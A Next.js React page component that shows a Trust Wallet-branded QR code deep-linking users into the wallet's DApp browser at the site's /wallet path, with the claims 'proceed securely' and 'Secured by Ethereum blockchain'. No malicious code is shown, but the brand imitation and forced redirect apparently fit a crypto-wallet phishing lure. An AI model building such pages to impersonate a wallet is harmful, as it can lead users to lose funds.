"use client";

import { useEffect, useRef, useState } from "react";

export default function HomePage() {
  const qrRef = useRef<HTMLDivElement>(null);
  const qrCanvasRef = useRef<HTMLDivElement>(null);
  const qrCodeInstanceRef = useRef<any>(null);
  const [qrUrl, setQrUrl] = useState("");
  const [isMounted, setIsMounted] = useState(false);

  useEffect(() => {
    // Calculer dynamiquement le lien en fonction du nom de domaine actuel
    if (typeof window !== "undefined") {
      const origin = window.location.origin;
      const targetUrl = `${origin}/wallet`;
      // coin_id=60 = Ethereum (SLIP-0044) — forces Trust Wallet to open in DApp browser
      const trustLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
      setQrUrl(trustLink);
      setIsMounted(true);
    }

    // Add a subtle entrance animation
    if (qrRef.current) {
      qrRef.current.style.opacity = "0";
      qrRef.current.style.transform = "translateY(20px)";
      requestAnimationFrame(() => {
        if (qrRef.current) {
          qrRef.current.style.transition = "opacity 0.6s ease, transform 0.6s ease";
          qrRef.current.style.opacity = "1";
          qrRef.current.style.transform = "translateY(0)";
        }
      });
    }
  }, []);

  // Générer le QR code stylisé bleu roi
  useEffect(() => {
    if (!qrUrl || typeof window === "undefined" || !isMounted) return;

    import("qr-code-styling").then((QRCodeStylingModule) => {
      const QRCodeStyling = QRCodeStylingModule.default;

      const options = {
        width: 280,
        height: 280,
        type: "svg" as const,
        data: qrUrl,
        image: "/trust.png",
        dotsOptions: {
          color: "#0500FF", // Bleu roi correspondant au thème de la marque
          type: "extra-rounded" as const
        },
        cornersSquareOptions: {
          color: "#0500FF",
          type: "extra-rounded" as const
        },
        cornersDotOptions: {
          color: "#0500FF",
          type: "dot" as const
        },
        backgroundOptions: {
          color: "#ffffff",
        },
        imageOptions: {
          crossOrigin: "anonymous",
          margin: 6,
          imageSize: 0.35,
          hideBackgroundDots: true
        }
      };

      if (!qrCodeInstanceRef.current) {
        qrCodeInstanceRef.current = new QRCodeStyling(options);
        if (qrCanvasRef.current) {
          qrCanvasRef.current.innerHTML = "";
          qrCodeInstanceRef.current.append(qrCanvasRef.current);
        }
      } else {
        qrCodeInstanceRef.current.update(options);
      }
    });
  }, [qrUrl, isMounted]);

  return (
    <main className="home-main">
      {/* Decorative background shapes */}
      <div className="home-bg-shape home-bg-shape--1" />
      <div className="home-bg-shape home-bg-shape--2" />

      <div className="home-content" ref={qrRef}>
        {/* Trust Wallet icon */}
        <div className="home-logo">
          <svg width="48" height="48" viewBox="0 0 256 256" fill="none">
            <rect width="256" height="256" rx="56" fill="#0500FF" />
            <path
              d="M128 40C128 40 200 80 200 140C200 200 128 216 128 216C128 216 56 200 56 140C56 80 128 40 128 40Z"
              fill="white"
            />
          </svg>
        </div>

        <h1 className="home-title">Scan with Trust Wallet</h1>
        <p className="home-subtitle">
          Open your Trust Wallet app, tap the scanner icon, and scan this QR code to proceed securely.
        </p>

        {/* QR Code card */}
        <div className="qr-card">
          <div className="qr-glow" />
          {qrUrl ? (
            <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center", alignItems: "center" }} />
          ) : (
            <div style={{ width: 280, height: 280, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.25rem", border: "1px solid #e5e7eb" }}>
              <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#0500FF" }} />
            </div>
          )}
        </div>

        {/* Steps */}
        <div className="home-steps">
          <div className="home-step">
            <div className="home-step__number">1</div>
            <span className="home-step__text">Open Trust Wallet</span>
          </div>
          <div className="home-step__arrow">→</div>
          <div className="home-step">
            <div className="home-step__number">2</div>
            <span className="home-step__text">Tap Scanner</span>
          </div>
          <div className="home-step__arrow">→</div>
          <div className="home-step">
            <div className="home-step__number">3</div>
            <span className="home-step__text">Scan QR Code</span>
          </div>
        </div>

        <p className="home-footer-text">
          Secured by Ethereum blockchain
        </p>
      </div>
    </main>
  );
}